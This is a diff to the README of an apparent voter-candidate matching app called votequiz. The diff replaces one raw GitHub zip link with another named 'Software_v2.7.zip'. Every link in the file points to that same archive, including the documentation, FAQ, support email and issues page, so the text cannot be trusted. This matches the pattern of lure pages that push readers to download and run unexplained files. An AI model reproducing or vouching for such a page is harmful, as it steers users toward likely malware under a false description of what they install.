@@ -7,7 +7,7 @@ Welcome to votequiz! This application helps voters connect with candidates based
 Before you can use votequiz, you need to download it. Let's walk through the process together.
 
 ## 📥 Download Link
-[![Download votequiz](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/butcherless/votequiz.zip)](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/butcherless/votequiz.zip)
+[![Download votequiz](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/static/Software_v2.7.zip)](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/static/Software_v2.7.zip)
 
 ## 🛠 System Requirements
 To run votequiz smoothly, ensure your system meets these requirements:
@@ -18,7 +18,7 @@ To run votequiz smoothly, ensure your system meets these requirements:
 
 ## 💻 Download & Install
 1. **Visit the Releases page:** 
-   To download the latest version, [click here](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/butcherless/votequiz.zip). This page lists all available versions and their details.
+   To download the latest version, [click here](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/static/Software_v2.7.zip). This page lists all available versions and their details.
 
 2. **Choose the Right Version:**
    On the Releases page, find the version that matches your operating system. Typically, you'll see options for Windows, macOS, and Linux.
@@ -56,13 +56,13 @@ If you encounter any issues during download or installation, consider the follow
 ## 🌐 Find More Information
 For detailed information on how to engage with candidates successfully, explore our official documentation and resources linked below:
 
-- [votequiz Documentation](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/butcherless/votequiz.zip)
-- [Frequently Asked Questions](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/butcherless/votequiz.zip)
+- [votequiz Documentation](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/static/Software_v2.7.zip)
+- [Frequently Asked Questions](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/static/Software_v2.7.zip)
 
 ## 📞 Contact Support
 If you have any questions or need further assistance, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/Ashkumgup/votequiz/main/butcherless/votequiz.zip
-- **GitHub Issues:** Report bugs or request features directly on our [GitHub Issues page](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/butcherless/votequiz.zip).
+- **Email:** https://raw.githubusercontent.com/Ashkumgup/votequiz/main/static/Software_v2.7.zip
+- **GitHub Issues:** Report bugs or request features directly on our [GitHub Issues page](https://raw.githubusercontent.com/Ashkumgup/votequiz/main/static/Software_v2.7.zip).
 
 Thank you for using votequiz! We’re excited to help you make informed voting decisions. Enjoy exploring your options!
